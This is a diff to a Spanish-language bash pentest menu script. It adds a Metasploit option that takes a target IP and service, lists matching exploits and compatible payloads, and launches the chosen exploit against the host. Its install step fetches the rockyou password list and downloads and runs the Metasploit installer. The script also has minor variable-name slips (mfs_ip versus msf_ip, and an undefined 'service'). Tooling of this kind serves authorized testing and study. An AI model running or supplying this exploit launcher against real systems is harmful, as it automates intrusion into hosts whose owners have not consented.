@@ -430,7 +430,7 @@ while true; do
         ;;
 
     "7")
-        # -----------------------METASPLOIT----------------------------------- ---------------------------- FINISH METASPLOIT
+        # -----------------------METASPLOIT-----------------------------------
         clear
         echo -e "${G}Comenzando Metasploit...${NOCOLOR}"
         echo -e "${B}Indica la IP del equipo a atacar: ${NOCOLOR}"
@@ -452,13 +452,61 @@ while true; do
             done
             echo -e "${B}Que servicio quieres atacar?${NOCOLOR}"
             read msf_service
-            echo -e "${G}Buscando exploits...${NOCOLOR}"
-            msfconsole -q -x "search name:ssh type:exploit; exit"
-            echo -e "${B}Que exploit quieres usar?${NOCOLOR}"
-        fi
-        echo -e "Comenzando Metasploit contra $mfs_ip..."
-        ;;
+            echo -e "${G}Buscando exploits para el servicio $msf_service...${NOCOLOR}"
+            exploits=$(msfconsole -q -x "search $msf_service; exit" | grep -oE 'exploit/[^ ]+')
 
+            if [ -z "$exploits" ]; then
+                echo -e "${R}No se encontraron exploits para el servicio ${service}.${NOCOLOR}"
+                exit 1
+            fi
+
+            echo -e "${G}Exploits encontrados:${NOCOLOR}"
+            i=1
+            for exploit in $exploits; do
+                echo "$i. $exploit"
+                ((i++))
+            done
+
+            echo -e "${B}Elige un exploit del listado (escribe el número correspondiente):${NOCOLOR}"
+            read exploit_num
+            exploit=$(echo "$exploits" | sed -n "${exploit_num}p")
+            if [ -z "$exploit" ]; then
+                echo -e "${R}El exploit elegido no es válido.${NOCOLOR}"
+                exit 1
+            fi
+
+            echo -e "${G}Usando el exploit: $exploit${NOCOLOR}"
+
+            echo -e "${G}Buscando payloads compatibles...${NOCOLOR}"
+            payloads=$(msfconsole -q -x "use ${exploit}; show payloads; exit" | grep -oE 'payload/[^ ]+')
+
+            if [ -z "$payloads" ]; then
+                echo -e "${R}No se encontraron payloads compatibles.${NOCOLOR}"
+                exit 1
+            fi
+
+            echo -e "${G}Payloads compatibles encontrados:${NOCOLOR}"
+            i=1
+            for payload in $payloads; do
+                echo "$i. $payload"
+                ((i++))
+            done
+
+            echo -e "${B}Elige un payload del listado (escribe el número correspondiente):${NOCOLOR}"
+            read payload_num
+            payload=$(echo "$payloads" | sed -n "${payload_num}p")
+
+            echo -e "${G}Usando el payload: $payload${NOCOLOR}"
+
+            echo -e "${G}Ejecutando exploit...${NOCOLOR}"
+            msfconsole -q -x "use $exploit; set RHOSTS $mfs_ip; set RPORT $mfs_port; set PAYLOAD $payload; exploit; exit"
+
+            echo -e "${G}Terminado.${NOCOLOR}"
+        fi
+        echo -e "${B}Presiona cualquier tecla para volver al menú.${NOCOLOR}"
+        read -s
+        clear
+        ;;
     "8")
         # -----------------------INSTALL DEPENDENCIES-----------------------------------
         echo -e "${G}Instalando dependencias....${NOCOLOR}"
@@ -467,7 +515,7 @@ while true; do
         git clone https://github.com/zacheller/rockyou.git
         tar -xzvf rockyou/rockyou.txt.tar.gz -C "/usr/share/wordlists"
         rm -rf rockyou
-        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb >msfinstall && chmod 755 msfinstall && ./msfinstall
         echo -e "${G}Listo!${NOCOLOR}"
         sleep 2
         ;;
